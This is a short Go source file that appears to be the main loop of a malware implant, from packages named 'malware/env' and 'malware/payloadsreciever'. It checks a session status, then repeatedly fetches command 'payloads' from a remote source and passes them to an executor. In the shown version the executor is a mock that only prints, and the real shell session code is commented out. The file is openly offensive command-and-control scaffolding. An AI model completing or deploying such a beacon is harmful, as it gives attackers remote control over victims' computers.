package main 

import (
	"fmt"
	. "malware/env"
	. "malware/payloadsreciever"
	// . "malware/commands_executer"
	// "runtime"
	"time"
)


func executeCommand(commandString string){ // mock
	fmt.Println(commandString)
}

func defaultHandleError(err error){
	if(err == nil){
		return  // nothing to do here, just return without panic.
	}
	panic(err)
}

func main() {
	// shell := ShellSession{
	// 	CurrentDir: ".",
	// 	Os:         runtime.GOOS,
	// }
	
	// command := "dir"
	// shell.ExecuteCommand(command)

	env := GetEnv()

	refreshPeriod := 5

	shouldCheckForNewPayloads := true

	for {
		if(shouldCheckForNewPayloads){
			
			sessionState := GetSessionStatus(env)
			fmt.Println(sessionState.Payload)
			if(sessionState.Payload == "opened"){
				shouldCheckForNewPayloads = false 
				refreshPeriod = 1  
			}
			continue
		}
		
		commandString,err := GetPayload(env)

		defaultHandleError(err)
		executeCommand(commandString.Body.Item)

		time.Sleep(time.Duration(refreshPeriod) * time.Second)
	}
}
